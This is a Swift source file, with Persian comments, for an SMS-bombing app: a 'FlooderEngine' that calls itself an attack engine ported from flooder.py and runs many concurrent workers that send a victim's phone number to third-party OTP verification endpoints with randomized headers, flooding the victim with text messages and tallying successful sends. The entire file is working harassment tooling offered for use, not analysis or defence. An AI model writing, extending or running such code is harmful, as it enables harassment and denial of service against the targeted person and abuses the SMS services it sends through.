import Foundation
import Combine

/// آمار زنده اجرا (معادل stats در flooder.py)
struct FloodStats {
    var sent = 0
    var failed = 0
    var total = 0
    var rate = 0.0
    var elapsed = 0.0
    var servicesUsed: [String: Int] = [:]
}

/// موتور اصلی حمله (پورت از کلاس SMSFlooder در flooder.py)
final class FlooderEngine: ObservableObject {
    @Published private(set) var isRunning = false
    @Published private(set) var stats = FloodStats()
    @Published private(set) var lastMessage = "آماده"

    @Published var target = ""
    @Published var threads = 40
    @Published var delay = 0.05
    @Published var maxMessages = 0
    @Published var services = OTPService.allServices

    private let lock = NSLock()
    private var sentCount = 0
    private var failedCount = 0
    private var servicesUsedCount: [String: Int] = [:]
    private var runningTasks = 0
    private var stopRequested = false
    private var startTime = Date()
    private var workers: [Task<Void, Never>] = []
    private var statsTimer: Timer?

    deinit {
        statsTimer?.invalidate()
    }

    // MARK: - کنترل

    func start() {
        guard !isRunning else { return }
        guard !target.isEmpty else {
            lastMessage = "ابتدا شماره را وارد کنید"
            return
        }
        let activeServices = services.filter { $0.active }
        guard !activeServices.isEmpty else {
            lastMessage = "حداقل یک سرویس را فعال کنید"
            return
        }

        lock.lock()
        sentCount = 0
        failedCount = 0
        servicesUsedCount = [:]
        runningTasks = 0
        stopRequested = false
        lock.unlock()

        startTime = Date()
        isRunning = true
        lastMessage = "شروع: \(threads) نخ - \(activeServices.count) سرویس"
        publishStats()

        statsTimer = Timer.scheduledTimer(withTimeInterval: 0.5, repeats: true) { [weak self] _ in
            self?.publishStats()
        }

        let servicesSnapshot = activeServices
        let targetSnapshot = target
        let maxMessagesSnapshot = maxMessages
        let delaySnapshot = delay

        for _ in 0..<threads {
            let task = Task.detached(priority: .utility) { [weak self] in
                await self?.workerLoop(
                    services: servicesSnapshot,
                    target: targetSnapshot,
                    maxMessages: maxMessagesSnapshot,
                    delay: delaySnapshot
                )
            }
            workers.append(task)
        }
    }

    func stop(auto: Bool = false) {
        guard isRunning || auto else { return }
        lock.lock()
        stopRequested = true
        lock.unlock()
        statsTimer?.invalidate()
        statsTimer = nil

        let elapsed = Date().timeIntervalSince(startTime)
        isRunning = false

        lock.lock()
        let sent = sentCount
        let failed = failedCount
        let used = servicesUsedCount
        lock.unlock()

        stats = FloodStats(
            sent: sent,
            failed: failed,
            total: sent + failed,
            rate: elapsed > 1 ? Double(sent) / elapsed : 0,
            elapsed: elapsed,
            servicesUsed: topServices(from: used)
        )
        lastMessage = auto ? "اتمام خودکار (سقف پیام‌ها)" : "متوقف شد"
        workers.removeAll()
    }

    // MARK: - کارگرها

    private func workerLoop(
        services: [OTPService],
        target: String,
        maxMessages: Int,
        delay: Double
    ) async {
        lock.lock()
        runningTasks += 1
        lock.unlock()

        var localCount = 0
        while true {
            if isStopRequested() { break }
            guard let service = services.randomElement() else {
                try? await Task.sleep(for: .milliseconds(200))
                continue
            }

            let ok = await send(service: service, target: target)

            lock.lock()
            if ok {
                sentCount += 1
                servicesUsedCount[service.name, default: 0] += 1
            } else {
                failedCount += 1
            }
            lock.unlock()

            if maxMessages > 0 {
                localCount += 1
                if localCount >= maxMessages { break }
            }
            if delay > 0 {
                let duration = delay * Double.random(in: 0.3...1.0)
                try? await Task.sleep(for: .seconds(duration))
            }
        }

        lock.lock()
        runningTasks -= 1
        let remaining = runningTasks
        let autoStop = !stopRequested && maxMessages > 0 && remaining == 0
        lock.unlock()

        if autoStop {
            await MainActor.run { self.stop(auto: true) }
        }
    }

    private func isStopRequested() -> Bool {
        lock.lock()
        let value = stopRequested
        lock.unlock()
        return value
    }

    // MARK: - ارسال

    private func send(service: OTPService, target: String) async -> Bool {
        let number = service.formattedNumber(target)
        guard let url = service.resolvedURL(for: number) else { return false }

        var request = URLRequest(url: url, timeoutInterval: 5)
        request.httpMethod = "POST"
        request.allHTTPHeaderFields = HeaderFactory.randomHeaders()
        request.httpBody = service.bodyData(for: number)

        do {
            let (_, response) = try await URLSession.shared.data(for: request)
            if let http = response as? HTTPURLResponse {
                return http.statusCode < 400
            }
            return false
        } catch let error as URLError where error.code == .timedOut {
            // Timeout یعنی احتمالاً SMS ارسال شده ولی جوابی نیامده
            return true
        } catch {
            return false
        }
    }

    // MARK: - آمار

    private func publishStats() {
        guard isRunning else { return }
        lock.lock()
        let sent = sentCount
        let failed = failedCount
        lock.unlock()

        let elapsed = Date().timeIntervalSince(startTime)
        stats = FloodStats(
            sent: sent,
            failed: failed,
            total: sent + failed,
            rate: elapsed > 1 ? Double(sent) / elapsed : 0,
            elapsed: elapsed,
            servicesUsed: topServices()
        )
    }

    private func topServices() -> [String: Int] {
        lock.lock()
        let used = servicesUsedCount
        lock.unlock()
        return topServices(from: used)
    }

    private func topServices(from dict: [String: Int]) -> [String: Int] {
        Dictionary(uniqueKeysWithValues: dict.sorted { $0.value > $1.value }.prefix(15))
    }

    // MARK: - تست اندپوینت‌ها

    func testEndpoints() async {
        let number = target
        guard !number.isEmpty else {
            await MainActor.run { self.lastMessage = "ابتدا شماره را وارد کنید" }
            return
        }

        let candidates = Array(services.filter { $0.active }.prefix(10))
        var lines: [String] = []
        for service in candidates {
            let ok = await send(service: service, target: number)
            lines.append("\(service.name): \(ok ? "موفق" : "ناموفق")")
            try? await Task.sleep(for: .seconds(0.3))
        }
        let message = lines.joined(separator: "\n")
        await MainActor.run { self.lastMessage = message }
    }

    // MARK: - قالب‌بندی شماره

    /// تبدیل ارقام فارسی/عربی به انگلیسی
    static func normalizeDigits(_ input: String) -> String {
        let map: [Character: Character] = [
            "۰": "0", "۱": "1", "۲": "2", "۳": "3", "۴": "4",
            "۵": "5", "۶": "6", "۷": "7", "۸": "8", "۹": "9",
            "٠": "0", "١": "1", "٢": "2", "٣": "3", "٤": "4",
            "٥": "5", "٦": "6", "٧": "7", "٨": "8", "٩": "9",
        ]
        return String(input.map { map[$0] ?? $0 })
    }

    /// معادل _format_number در flooder.py
    static func formatNumber(_ raw: String) -> String {
        var number = raw.trimmingCharacters(in: .whitespacesAndNewlines)
        if number.isEmpty { return "" }
        if number.hasPrefix("+") {
            // حذف +98 و نگه داشتن ۰۹۱۲...
            number = "0" + String(number.dropFirst(3))
        } else if number.hasPrefix("98") && number.count == 12 {
            number = "0" + String(number.dropFirst(2))
        }
        if !number.hasPrefix("0") {
            number = "0" + number
        }
        return number
    }
}
